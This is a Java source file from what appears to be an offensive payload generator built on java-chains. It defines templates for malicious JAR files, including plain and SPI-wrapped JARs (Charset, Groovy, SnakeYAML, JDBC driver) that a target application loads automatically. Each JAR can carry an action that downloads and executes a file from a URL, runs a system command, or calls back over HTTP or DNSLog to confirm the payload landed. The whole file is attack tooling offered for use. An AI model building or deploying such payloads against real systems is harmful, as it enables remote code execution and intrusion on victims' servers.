package payload;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

/**
 * HTTP 带外 Jar 的生成模板：把「打成什么样的 Jar」与「Jar 落地后做什么」拆成两组选择。
 *
 * <p>本类只描述模板，不构建载荷：链的节点序列与参数键都在这里算好，
 * 真正构建仍走 {@link PayloadEngine}。这样界面层不必知道 java-chains 的节点命名，
 * 上游换节点时改动范围被限制在本文件与 {@link ToStringPreset}。
 *
 * <p>节点与参数键全部取自上游元数据实测（见 docs/DESIGN-payload.md）：
 * <ul>
 *   <li>Jar 包装节点之后必须接字节码转换节点，否则 Jar 里没有可用类；</li>
 *   <li>末端动作决定参数键：URL 类动作给 {@code DownloadExec.url} 这类完整键。</li>
 * </ul>
 *
 * <p>实测排除项：{@code CharsetJarConvert}（旧版 Charset 包装）在本机 JDK 17 下报
 * {@code ClassNotFoundException: sun.nio.cs.ext.MyExtendedCharsets}，因此目录里只保留
 * 可用的 {@code CharsetJarConvert2}；高版本 JDK 的 toString 模板需要额外开放
 * {@code java.io} / {@code java.util}，在 run.ps1 的两个 --add-opens 下不可用，同样不收录。
 */
public final class JarPreset {

    /** Jar 包装类型：决定产物形态与默认文件名。 */
    public static final class Kind {
        /** 上游节点 id。 */
        public final String nodeId;
        /** 界面显示名。 */
        public final String name;
        /** 一句话说明。 */
        public final String summary;
        /** 默认文件名。 */
        public final String fileName;

        Kind(String nodeId, String name, String summary, String fileName) {
            this.nodeId = nodeId == null ? "" : nodeId;
            this.name = name == null || name.trim().isEmpty() ? this.nodeId : name;
            this.summary = summary == null ? "" : summary;
            this.fileName = fileName == null || fileName.trim().isEmpty() ? "payload.jar" : fileName;
        }
    }

    /**
     * 末端动作：Jar 被加载后要做什么。
     *
     * <p>{@code urlParam} / {@code commandParam} / {@code pathParam} 是上游的完整参数键；
     * 为空表示该动作不使用这一项，界面据此禁用对应输入框——
     * 让使用者填一个永远不会被下发的字段，比少一个输入框更糟。
     */
    public static final class Action {
        public final String nodeId;
        public final String name;
        public final String summary;
        /** 需要 URL 时的完整参数键；空表示不需要。 */
        public final String urlParam;
        /** URL 输入框的标签。 */
        public final String urlLabel;
        /** 需要命令 / 执行参数时的完整参数键；空表示不需要。 */
        public final String commandParam;
        /** 命令输入框的标签。 */
        public final String commandLabel;
        /** 需要落地路径时的完整参数键；空表示不需要。 */
        public final String pathParam;
        /** 路径默认值。 */
        public final String pathDefault;

        Action(String nodeId, String name, String summary, String urlParam, String urlLabel,
               String commandParam, String commandLabel, String pathParam, String pathDefault) {
            this.nodeId = nodeId == null ? "" : nodeId;
            this.name = name == null || name.trim().isEmpty() ? this.nodeId : name;
            this.summary = summary == null ? "" : summary;
            this.urlParam = urlParam == null ? "" : urlParam;
            this.urlLabel = urlLabel == null || urlLabel.trim().isEmpty() ? "URL" : urlLabel;
            this.commandParam = commandParam == null ? "" : commandParam;
            this.commandLabel = commandLabel == null || commandLabel.trim().isEmpty()
                    ? "命令" : commandLabel;
            this.pathParam = pathParam == null ? "" : pathParam;
            this.pathDefault = pathDefault == null ? "" : pathDefault;
        }

        /** 是否需要一个 URL。 */
        public boolean usesUrl() {
            return !urlParam.isEmpty();
        }

        /** 是否需要命令 / 执行参数。 */
        public boolean usesCommand() {
            return !commandParam.isEmpty();
        }

        /** 是否需要落地路径。 */
        public boolean usesPath() {
            return !pathParam.isEmpty();
        }
    }

    /** Jar 里字节码的类名模式：固定为 manual，让「自定义目标类」真正进入载荷。 */
    private static final String CLASS_NAME_MODE_PARAM = "BytecodeConvert.classNameMode";
    private static final String CLASS_NAME_PARAM = "BytecodeConvert.className";
    private static final String CLASS_PREFIX_PARAM = "BytecodeConvert.classNamePrefix";
    /** Jar 包装节点与末端动作之间的字节码转换节点：没有它 Jar 里只有空的包装结构。 */
    private static final String BYTECODE_CONVERT = "bytecodeconvert";
    /** 生成可执行 Jar（写入 Main-Class）的开关参数。 */
    private static final String MAIN_CLASS_PARAM = "Jar.mainClass";

    private JarPreset() {
    }

    /** 全部 Jar 包装类型，按界面展示顺序。 */
    public static List<Kind> kinds() {
        List<Kind> kinds = new ArrayList<Kind>();
        kinds.add(new Kind("jar", "普通 JAR",
                "标准 JAR 包装，可直接被目标 ClassLoader 加载", "payload.jar"));
        kinds.add(new Kind("charsetjarconvert2", "Charset SPI JAR",
                "Charset 提供者 SPI，适用于 SpringBoot 写 Jar 落地场景", "charset-provider.jar"));
        kinds.add(new Kind("groovyjarconvert", "Groovy SPI JAR",
                "ASTTransformation SPI，目标依赖 Groovy 时可被自动加载", "groovy.jar"));
        kinds.add(new Kind("snakeyamljarconvert", "SnakeYAML SPI JAR",
                "ScriptEngineFactory SPI，目标依赖 SnakeYAML 时可被自动加载", "snakeyaml.jar"));
        kinds.add(new Kind("jdbcdriverjarconvert", "JDBC Driver JAR",
                "java.sql.Driver SPI，适用于驱动可上传 / 可加载的场景", "jdbc-driver.jar"));
        return Collections.unmodifiableList(kinds);
    }

    /** 全部末端动作，按界面展示顺序。 */
    public static List<Action> actions() {
        List<Action> actions = new ArrayList<Action>();
        actions.add(new Action("downloadexec", "从 URL 下载并执行",
                "Jar 被执行时先从指定 URL 拉取文件，落到本地后带参数执行",
                "DownloadExec.url", "下载 URL",
                "DownloadExec.params", "执行参数",
                "DownloadExec.path", "/tmp/payload.bin"));
        actions.add(new Action("exec", "执行命令",
                "Jar 被执行时直接调用系统命令", "", "", "Exec.cmd", "命令", "", ""));
        actions.add(new Action("httpreq", "回连 HTTP 请求",
                "Jar 被执行时向指定 URL 发起一次 HTTP 请求，用于确认落地是否成功",
                "HTTPReq.url", "回连 URL", "", "", "", ""));
        actions.add(new Action("download", "从 URL 下载文件",
                "Jar 被执行时把 URL 上的文件下载到指定路径，不自动执行",
                "Download.url", "下载 URL", "", "", "Download.path", "/tmp/payload.bin"));
        actions.add(new Action("dnslog", "DNSLog 探测",
                "Jar 被执行时向指定 DNSLog 域名发起解析，用于确认落地是否成功",
                "DNSLog.dnslog", "DNSLog 域名", "", "", "", ""));
        return Collections.unmodifiableList(actions);
    }

    /** 按节点 id 取包装类型；找不到返回 null，由调用方给出可读提示。 */
    public static Kind kindOf(String nodeId) {
        if (nodeId == null) return null;
        for (Kind kind : kinds()) {
            if (kind.nodeId.equalsIgnoreCase(nodeId.trim())) return kind;
        }
        return null;
    }

    /** 按节点 id 取末端动作；找不到返回 null，由调用方给出可读提示。 */
    public static Action actionOf(String nodeId) {
        if (nodeId == null) return null;
        for (Action action : actions()) {
            if (action.nodeId.equalsIgnoreCase(nodeId.trim())) return action;
        }
        return null;
    }

    /**
     * 组装节点序列：包装 → 字节码转换 → 末端动作。
     *
     * <p>顺序不能颠倒：字节码转换要在包装之前产出类字节，
     * 末端动作则是对已生成的类做的加工。
     */
    public static List<String> gadgets(String kindNodeId, String actionNodeId) {
        List<String> gadgets = new ArrayList<String>();
        Kind kind = kindOf(kindNodeId);
        Action action = actionOf(actionNodeId);
        if (kind == null || action == null) return gadgets;
        gadgets.add(kind.nodeId);
        gadgets.add(BYTECODE_CONVERT);
        gadgets.add(action.nodeId);
        return gadgets;
    }

    /**
     * 组装参数。
     *
     * <p>空值一律不下发：下发空串会把上游默认值覆盖成空，实测表现为载荷里命令为空。
     *
     * @param kindNodeId      包装类型节点 id
     * @param actionNodeId    末端动作节点 id
     * @param url             自定义 URL；动作不需要 URL 时忽略
     * @param command         自定义命令 / 执行参数；动作不需要时忽略
     * @param path            落地路径；留空时用动作默认值
     * @param targetClass     自定义目标类名；留空则沿用引擎随机类名
     * @param classNamePrefix 类名前缀；留空不下发
     * @param executable      是否写入 Main-Class，使 Jar 可直接执行
     */
    public static Map<String, Object> params(String kindNodeId, String actionNodeId, String url,
                                             String command, String path, String targetClass,
                                             String classNamePrefix, boolean executable) {
        Map<String, Object> params = new LinkedHashMap<String, Object>();
        Kind kind = kindOf(kindNodeId);
        Action action = actionOf(actionNodeId);
        if (kind == null || action == null) return params;

        if (action.usesUrl()) put(params, action.urlParam, url);
        if (action.usesCommand()) put(params, action.commandParam, command);
        if (action.usesPath()) {
            String chosen = path == null || path.trim().isEmpty() ? action.pathDefault : path;
            put(params, action.pathParam, chosen);
        }
        if (executable) params.put(MAIN_CLASS_PARAM, "true");

        String custom = targetClass == null ? "" : targetClass.trim();
        if (!custom.isEmpty()) {
            params.put(CLASS_NAME_MODE_PARAM, "manual");
            params.put(CLASS_NAME_PARAM, custom);
        }
        put(params, CLASS_PREFIX_PARAM, classNamePrefix);
        return params;
    }

    /** 产物字节是否为合法 Zip / Jar：前四字节固定为 PK\x03\x04。 */
    public static boolean looksLikeJar(byte[] data) {
        return data != null && data.length >= 4
                && data[0] == 0x50 && data[1] == 0x4B && data[2] == 0x03 && data[3] == 0x04;
    }

    private static void put(Map<String, Object> params, String key, String value) {
        String text = value == null ? "" : value.trim();
        if (key == null || key.isEmpty() || text.isEmpty()) return;
        params.put(key, text);
    }

    /** 载荷载体：Jar 类链统一从 OtherPayload 起，实测其余载体接不上 Jar 包装节点。 */
    public static String carrier() {
        return "otherpayload";
    }

    /** 载体显示名，供界面展示；取不到时回退成标识。 */
    public static String describe(String kindNodeId, String actionNodeId) {
        Kind kind = kindOf(kindNodeId);
        Action action = actionOf(actionNodeId);
        if (kind == null || action == null) {
            return "请选择 Jar 类型与末端动作。";
        }
        return kind.name + "  ·  " + action.name;
    }

    /** 链的展示文本，用于界面预览与复制。 */
    public static String chainText(String kindNodeId, String actionNodeId) {
        StringBuilder text = new StringBuilder();
        List<String> nodes = new ArrayList<String>();
        nodes.add(carrier());
        nodes.addAll(gadgets(kindNodeId, actionNodeId));
        for (String node : nodes) {
            if (text.length() > 0) text.append(" -> ");
            text.append(node);
        }
        return text.toString();
    }

    /** 参数键是否属于「自定义目标类」这一类；供界面把类名相关字段高亮提示。 */
    public static boolean isClassNameKey(String key) {
        if (key == null) return false;
        String lower = key.toLowerCase(Locale.ROOT);
        return classNameKeys().contains(lower);
    }

    private static List<String> classNameKeys() {
        return Arrays.asList(CLASS_NAME_PARAM.toLowerCase(Locale.ROOT),
                CLASS_NAME_MODE_PARAM.toLowerCase(Locale.ROOT),
                CLASS_PREFIX_PARAM.toLowerCase(Locale.ROOT));
    }
}
